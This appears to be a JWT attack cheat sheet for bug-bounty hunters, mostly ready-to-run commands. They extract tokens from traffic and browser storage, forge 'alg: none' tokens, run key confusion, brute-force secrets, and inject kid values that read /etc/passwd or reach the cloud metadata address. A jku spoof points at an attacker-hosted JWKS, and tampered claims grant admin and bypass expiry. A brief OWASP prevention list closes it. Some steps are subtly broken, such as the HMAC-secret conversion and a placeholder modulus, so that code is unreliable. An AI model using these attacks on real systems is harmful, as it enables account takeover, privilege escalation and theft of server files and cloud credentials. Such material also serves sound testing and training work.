# JWT (JSON Web Token) Security Testing

> Comprehensive JWT security testing for bug bounty hunters and penetration testers. Covers token extraction, algorithm confusion, header parameter injection (kid/jku/jwk), weak secrets, and 2025‑2026 trends (kid path traversal/SSRF/RCE, jku/x5u remote JWKS spoofing).

## Methodology Overview

JSON Web Tokens (JWT) are compact, URL‑safe tokens for authentication/authorization, but misconfigurations allow signature bypass, algorithm downgrade, key confusion, and privilege escalation. Test these areas:

1. **Token Discovery**: Extract JWTs from HTTP traffic, JS files, localStorage, cookies
2. **Signature Bypass**: `alg: none`, invalid signature acceptance, missing verification
3. **Algorithm Confusion**: RS256/RS512 → HS256 using public key as HMAC secret
4. **Weak Secret Brute‑force**: HS256 with short/common secrets
5. **Header Parameter Injection**: `kid` (path traversal, SSRF, file read), `jku`/`x5u` (remote JWKS spoofing), `jwk` (embedded key)
6. **Claims Tampering**: Role escalation, expiration bypass, custom claims
7. **Token Sidejacking / Replay**: Reuse valid token after logout

## Token Discovery & Extraction

### From Live Traffic

```bash
# Extract JWTs from burp/history files
cat burp-history.json | jq -r '.[] | select(.response) | .response.text' | grep -oE "eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*" | anew jwts.txt

# From httpx/katana output
cat crawledurls.txt | httpx -silent | katana -d 3 -silent | grep -oE "eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*" | anew jwts.txt
```

### From JavaScript Files

```bash
# Extract from live JS links
cat livejslinks.txt | xargs -I@ curl -s @ | grep -oE "eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*" | sort -u | anew jwt-tokens.txt

# Recursive grep on domain
grep -r -o -E "eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*" downloaded-js/ | cut -d: -f2 | anew jwts.txt
```

### From Browser Storage

```javascript
// Console extraction from localStorage/sessionStorage
Object.keys(localStorage).forEach(k => { if(/eyJ.*\..*\..*/.test(localStorage[k])) console.log(k, localStorage[k]) });
Object.keys(sessionStorage).forEach(k => { if(/eyJ.*\..*\..*/.test(sessionStorage[k])) console.log(k, sessionStorage[k]) });

// Cookie extraction
document.cookie.split(';').map(c => c.trim()).filter(c => /eyJ.*\..*\..*/.test(c)).forEach(c => console.log(c));
```

## Quick Assessment Commands

### Decode & Inspect

```bash
# Decode JWT (header.payload) without verification
echo "eyJhbGciOiJIUzI1NiIs..." | cut -d. -f1,2 | tr -d '\n' | base64 -d 2>/dev/null | jq .

# Quick decode tip (in browser console)
JSON.parse(atob("PASTE_TOKEN_HERE".split('.')[1]))

# Full decode with python
python3 -c "import jwt, sys; t=sys.argv[1]; print(jwt.decode(t, options={'verify_signature': False}, algorithms=['HS256']))" "eyJhbGciOiJIUzI1NiIs..."

# Using jwt_tool
python3 jwt_tool.py "eyJhbGciOiJIUzI1NiIs..." -T
```

## Attack Vectors & Exploitation

### 1. Algorithm None Attack

```bash
# Create token with alg: none
python3 -c "
import jwt
header = '{\"alg\":\"none\",\"typ\":\"JWT\"}'
payload = '{\"sub\":\"admin\",\"iat\":1516239022}'
import base64
h = base64.urlsafe_b64encode(header.encode()).rstrip(b'=')
p = base64.urlsafe_b64encode(payload.encode()).rstrip(b'=')
print(f'{h.decode()}.{p.decode()}.')
"

# Alternative with jwt_tool
python3 jwt_tool.py "eyJ..." -X a
```

### 2. Algorithm Confusion (RS256 → HS256)

```bash
# Extract public key from existing token or JWKS endpoint
curl -s https://target.com/.well-known/jwks.json | jq -r '.keys[0].x5c[0]' | base64 -d > public.pem

# Convert public key to HMAC secret
openssl rsa -pubin -in public.pem -text -noout | grep -E 'modulus|exponent' | tr -d ' :\n' | xxd -r -p | base64 | tr -d '\n=' > hmac-secret.txt

# Sign new token with public key as HMAC secret
python3 jwt_tool.py "eyJ..." -S hs256 -k "$(cat hmac-secret.txt)" -p

# Using jwt_tool built-in
python3 jwt_tool.py "eyJ..." -S hs256 -k public.pem -p
```

### 3. Weak Secret Brute-force

```bash
# Using hashcat (mode 16500)
hashcat -m 16500 -a 0 "eyJ..." /usr/share/wordlists/rockyou.txt -O

# Using jwt-cracker
jwt-cracker "eyJ..." /usr/share/wordlists/rockyou.txt

# Using jwt_tool
python3 jwt_tool.py "eyJ..." -C -d /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt

# Custom wordlist for JWT secrets
curl -s https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list -o jwt-secrets.list
python3 jwt_tool.py "eyJ..." -C -d jwt-secrets.list
```

### 4. Header Parameter Injection

#### kid (Key ID) Injection

```bash
# Path traversal
python3 jwt_tool.py "eyJ..." -I -hc kid -hv "../../../../etc/passwd"

# SSRF via kid
python3 jwt_tool.py "eyJ..." -I -hc kid -hv "http://169.254.169.254/latest/meta-data/"

# File read via kid
python3 jwt_tool.py "eyJ..." -I -hc kid -hv "file:///var/www/html/config.php"

# Using empty key (dev/null)
python3 -c "
import jwt
token = jwt.encode({'user':'admin'}, '', algorithm='HS256')
print(token)
"
```

#### jku (JWK Set URL) Spoofing

```bash
# Create malicious JWKS
cat > evil-jwks.json <<EOF
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "evil-key",
      "n": "fake-modulus"
    }
  ]
}
EOF

# Host it
python3 -m http.server 8080 &
# Then inject jku pointing to http://attacker:8080/evil-jwks.json
python3 jwt_tool.py "eyJ..." -I -hc jku -hv "http://attacker:8080/evil-jwks.json"
```

#### jwk (JSON Web Key) Injection

```bash
# Generate RSA key pair
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# Embed public key in jwk header
python3 jwt_tool.py "eyJ..." -S rs256 -pr private.pem -I -hc jwk -hv "$(cat public.jwk.json)"
```

### 5. Claims Tampering & Privilege Escalation

```bash
# Modify claims with jwt_tool
python3 jwt_tool.py "eyJ..." -T -S hs256 -k "secret" -pc "isAdmin" -pv "true" -pc "role" -pv "admin"

# Bypass expiration
python3 jwt_tool.py "eyJ..." -T -S hs256 -k "secret" -pc "exp" -pv "9999999999" -pc "iat" -pv "0"

# Add custom claims
python3 jwt_tool.py "eyJ..." -T -S hs256 -k "secret" -pc "scope" -pv "admin:all"
```

## Tool Automation

### jwt_tool Cheat Sheet

```bash
# Comprehensive scan
python3 jwt_tool.py "eyJ..." -M at

# Test all attacks
python3 jwt_tool.py "eyJ..." -a

# Fuzz headers
python3 jwt_tool.py "eyJ..." -I -hc kid -hw /usr/share/seclists/Fuzzing/alphanum-case.txt

# Generate wordlist from token
python3 jwt_tool.py "eyJ..." -C -w /home/pwn/wordlists/custom-wordlist.txt
```

### Burp Suite + JWT Editor

```bash
# Convert Burp request to jwt_tool format
cat request.txt | grep -i authorization | cut -d' ' -f2 | xargs -I@ python3 jwt_tool.py @ -T

# Batch process tokens from file
cat jwts.txt | while read token; do
  python3 jwt_tool.py "$token" -T | grep -i "vulnerable\|admin\|success" && echo "VULN: $token"
done
```

## Prevention & Best Practices

From OWASP JWT Cheat Sheet:
1. **Reject alg:none** — always enforce signature verification
2. **Use strong algorithms** — RS256/RS384/RS512 or EdDSA (prefer asymmetric)
3. **Validate signature + algorithm** — hard‑check expected algorithm
4. **Secure kid/jku/x5u** — allow‑list or disable remote fetching
5. **Strong secrets** — ≥256‑bit random for HS* algorithms
6. **Short expiration** + refresh tokens + jti revocation
7. **Validate all claims** — iss, aud, sub, exp, nbf, iat
8. **Token binding** / sender‑constrained (RFC 8705)
9. **Store tokens securely** — HttpOnly + Secure cookies, avoid localStorage
10. **Implement token revocation** — denylist for logged‑out tokens

## References

- **PortSwigger JWT Attacks**: https://portswigger.net/web-security/jwt
- **PortSwigger JWT Algorithm Confusion**: https://portswigger.net/web-security/jwt/algorithm-confusion
- **OWASP JWT Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html
- **PayloadsAllTheThings – JWT**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Tokens
- **JWT Best Practices Internet Draft**: https://datatracker.ietf.org/doc/draft-ietf-oauth-jwt-bcp/
- **GitHub – jwt_tool**: https://github.com/ticarpi/jwt_tool
- **2025‑2026 Trends**: kid RCE, jku spoofing, public‑HMAC downgrade (Intigriti/HackerOne write‑ups)


